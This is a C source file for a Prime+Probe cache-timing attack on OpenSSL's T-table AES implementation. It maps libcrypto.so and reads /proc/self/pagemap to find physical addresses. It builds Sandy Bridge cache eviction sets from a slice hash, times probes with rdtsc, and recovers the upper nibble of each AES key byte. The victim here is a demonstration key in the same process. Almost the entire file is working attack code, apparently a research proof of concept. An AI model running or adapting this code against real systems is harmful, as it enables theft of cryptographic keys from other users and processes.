#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <stdlib.h>
#include <assert.h>
#include "openssl/aes.h"
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include "cacheutils.h"
#include <map>
#include <vector>
#include <algorithm>
#include <sys/time.h>


//TIME STAMP 

static struct timeval tm1;

static void timer_start()
{
    gettimeofday(&tm1, NULL); 
}

static void timer_stop()
{
    struct timeval tm2;
    gettimeofday(&tm2, NULL);

    unsigned long long t = 1000 * (tm2.tv_sec - tm1.tv_sec) + (tm2.tv_usec - tm1.tv_usec) / 1000;
    printf("%llu ms\n", t);
}

// TIME STAMP END


uint8_t eviction[64*1024*1024];
uint8_t* eviction_ptr;

int pagemap = -1;

uint64_t GetPageFrameNumber(int pagemap, uint8_t* virtual_address) {
  // Read the entry in the pagemap.
  uint64_t value;
  int got = pread(pagemap, &value, 8,(((uintptr_t)virtual_address) / 0x1000) * 8);
  assert(got == 8);
  uint64_t page_frame_number = value & ((1ULL << 54)-1);
  return page_frame_number;
}

int get_cache_slice(uint64_t phys_addr, int bad_bit) {
  static const int h0[] = { 6, 10, 12, 14, 16, 17, 18, 20, 22, 24, 25, 26, 27, 28, 30, 32, 33, 35, 36 };
  static const int h1[] = { 7, 11, 13, 15, 17, 19, 20, 21, 22, 23, 24, 26, 28, 29, 31, 33, 34, 35, 37 };

  int count = sizeof(h0) / sizeof(h0[0]);
  int hash = 0;
  
  for (int i = 0; i < count; i++) {
    hash ^= (phys_addr >> h0[i]) & 1;
  }

  count = sizeof(h1) / sizeof(h1[0]);
  int hash1 = 0;
  for (int i = 0; i < count; i++) {
    hash1 ^= (phys_addr >> h1[i]) & 1;
  }
  return hash1 << 1 | hash;
}

__attribute__((aligned(4096))) int in_same_cache_set(uint64_t phys1, uint64_t phys2, int bad_bit) {
  // For Sandy Bridge, the bottom 17 bits determine the cache set
  // within the cache slice (or the location within a cache line).

  // mask = 0x1ffff;

  uint64_t mask = ((uint64_t) 1 << 17) - 1;
  
  //printf("mask: %x \n", mask);

  //printf("phys1 : %x\n", phys1);
  //printf("phys2 : %x\n", phys2);

  //printf("cache set1: %x \n", get_cache_slice(phys1, bad_bit));
  //printf("cache set2: %x \n", get_cache_slice(phys2, bad_bit));

  //printf("phys1M : %x\n", phys1 & mask);
  //printf("phys2M : %x\n", phys2 & mask);

  return ((phys1 & mask) == (phys2 &mask) &&
          get_cache_slice(phys1, bad_bit) == get_cache_slice(phys2, bad_bit));
}

int g_pagemap_fd = -1;

// Extract the physical page number from a Linux /proc/PID/pagemap entry.
uint64_t frame_number_from_pagemap(uint64_t value) {
  return value & ((1ULL << 54) - 1);
}

void init_pagemap() {
  g_pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
  assert(g_pagemap_fd >= 0);
}

uint64_t get_physical_addr(uint64_t virtual_addr) {

  //printf("virtual_addr: %x \n", virtual_addr);

  uint64_t value;
  //printf("sizeOf: %d \n", sizeof(value));
  off_t offset = (virtual_addr / 4096) * sizeof(value);
  //printf("offset: %x \n", offset);
  int got = pread(g_pagemap_fd, &value, sizeof(value), offset);
  //printf("got: %d \n", got);
  assert(got == 8);

  // Check the "page present" flag.
  assert(value & (1ULL << 63));
  //printf("value: %x\n", value);

  uint64_t frame_num = frame_number_from_pagemap(value);
  
  //printf("frame_num %x \n", frame_num);

  return (frame_num * 4096) | (virtual_addr & (4095));
  
}

#define ADDR_COUNT 1024

volatile uint64_t* faddrs[16][ADDR_COUNT];

// for 8 MB cache, 16 way-associativity
// #define PROBE_COUNT 15

// for 3 MB cache, 12 way- associativity
#define PROBE_COUNT 11

void pick(volatile uint64_t** addrs, int step)
{
  int found = 1;
  uint8_t* buf = (uint8_t*) addrs[0];
  uint64_t phys1 = get_physical_addr((uint64_t)buf);
  //printf("%zx -> %zx\n",(uint64_t) buf, phys1);
  for (size_t i = 0; i < 64*1024*1024-4096; i += 4096) {
    uint64_t phys2 = get_physical_addr((uint64_t)(eviction_ptr + i));
    if (phys1 != phys2 && in_same_cache_set(phys1, phys2, -1)) {
      addrs[found] = (uint64_t*)(eviction_ptr+i);
      //printf("%zx -> %zx\n",(uint64_t) eviction_ptr+i, phys2);
      //*(addrs[found-1]) = addrs[found];
      found++;
    }
  }
  fflush(stdout);
}


unsigned char key[] =
{
  0xc0, 0xf0, 0xa0, 0x60, 0x20, 0x10, 0x40, 0x80,
  0xb0, 0xc0, 0xe0, 0x20, 0x80, 0xa0, 0x20, 0x10,
//  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
//  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
  //0x98, 0x56, 0x31, 0xab, 0xe3, 0xd2, 0xb3, 0x32, 0x52, 0x8f, 0xbb, 0x1d, 0xec, 0x45, 0xce, 0xcc, 0x4f, 0x6e, 0x9c,
  //0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80
};

size_t sum;
size_t scount;

//std::map<char*, std::map<size_t, size_t> > timings;

int timings[16][16];

int T[4] = {TABLE0, TABLE1, TABLE2, TABLE3};
//int T[4] = {0x100f00, 0x100700, 0xfff00, 0xff700};

char* base;
char* probe;
char* end;

uint64_t temp;


void prime(volatile register size_t idx) // cached
{
  // for 8 MB cache, 16 way-associativity
  //for (volatile register size_t i = 1; i < PROBE_COUNT+((idx == 11 || idx == 12)?-1:0); ++i)

  // for 3 MB cache, 12 way- associativity
  for (volatile register size_t i = 1; i < PROBE_COUNT+((idx == 7 || idx == 8)?-1:0); ++i)
  {

    *faddrs[idx][i];
    *faddrs[idx][i+1];
    *faddrs[idx][i+2];
    *faddrs[idx][i];
    *faddrs[idx][i+1];
    *faddrs[idx][i+2];
    
  }
}

int get_max_index(int timings[], int l){
  int res = 0;
  for (int i=0; i < l; i++){
   if (timings[i] > timings[res])
     res=i;
  }
  return res;
}

FILE *fStats;

int main()
{ 

  int ud = 0;
  fStats = fopen("values.dat","a+");
  
  int fd = open(OPENSSL "/libcrypto.so", O_RDONLY);
  size_t size = lseek(fd, 0, SEEK_END);
  if (size == 0)
    exit(-1);
  size_t map_size = size;
  if (map_size & 0xFFF != 0)
  {
    map_size |= 0xFFF;
    map_size += 1;
  }
  base = (char*) mmap(0, map_size, PROT_READ, MAP_SHARED, fd, 0);

  end = base + size;

  unsigned char plaintext[] =
  {
  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0
  };
  unsigned char ciphertext[128];
  unsigned char restoredtext[128];


  printf("Key used for encryption\n");
  for (size_t j = 0; j < 16; ++j){ //randomize the key for encryption
          //key[j] = rand() % 256;
    printf("%02x ", key[j]);
  }

  printf("\n");


  AES_KEY key_struct;

  AES_set_encrypt_key(key, 128, &key_struct);
  
  AES_encrypt(plaintext, ciphertext, &key_struct);
  
  for (size_t i = 0; i < 64*1024*1024; ++i)
    eviction[i] = i;

  for (int q = 0; q < 4; q++){ // 16   }
     probe = base + T[q];
     maccess(probe);
  }

  //printf("init pm\n");
  init_pagemap();

  for (int q = 0; q < 4; q++) // 16    
  {
    probe = base + T[q];
    faddrs[q][0] = (uint64_t*) probe;
  }


  uint64_t min_time = rdtsc();
  srand(min_time);
  sum = 0;
  size_t l = 0;
timer_start();
  for (size_t b =0; b < 16; ++b){ // the b-th byte // b < 16

    AES_encrypt(plaintext, ciphertext, &key_struct);
    sched_yield();

    for (size_t byte = 0; byte < 256; byte += 16)
    {
    
      unsigned char key_guess = byte;

      if (faddrs[b % 4][1] == 0)
      {
        eviction_ptr = (uint8_t*)(((size_t)eviction & ~0xFFF) | ((size_t)faddrs[b % 4][0] & 0xFFF));
        pick(faddrs[b % 4],1);
      }

      size_t count = 0;
      for (size_t i = 0; i < 200; ++i)
      {

        sched_yield();
        
        for (size_t j = 1; j < 16; ++j){
          plaintext[j] = rand() % 256;
        }

        plaintext[b] = ((l * 16) + (rand() % 16)) ^ key_guess;
        
        AES_encrypt(plaintext, ciphertext, &key_struct);
        sched_yield();
        size_t time = rdtsc();
        prime(b % 4);
        size_t delta = rdtsc() - time;


        //printf("%ld \n", delta);
        if (delta > 480){
          ++count;

	  if(ud){
	  	fprintf(fStats, "%zu\n", delta);
		ud = 0;
	  }

        }else{

	  if(!ud){
	  	fprintf(fStats, "%zu, ", delta);
		ud = 1;
	  }

	}

        sched_yield();
        timings[b][byte/16] = count;
        sched_yield();
      }

    }

    int tmp[16];
    for (size_t byte = 0; byte < 16; ++byte){

      tmp[byte] = timings[b][byte];

    }
    int max=get_max_index(tmp,16);
    printf("%x  ", max);


  }

  printf("\n");
  for (size_t b = 0; b < 16; ++b)
  {
    //printf("%p", (void*) (ait.first - base));
    for (size_t byte=0; byte < 16; ++byte)
    {
      printf("%6u ", timings[b][byte]);
    }
    printf("\n");
  }

  fclose(fStats);
  printf("\n");
  timer_stop();
  close(fd);
  munmap(base, map_size);
  fflush(stdout);
  return 0;
}

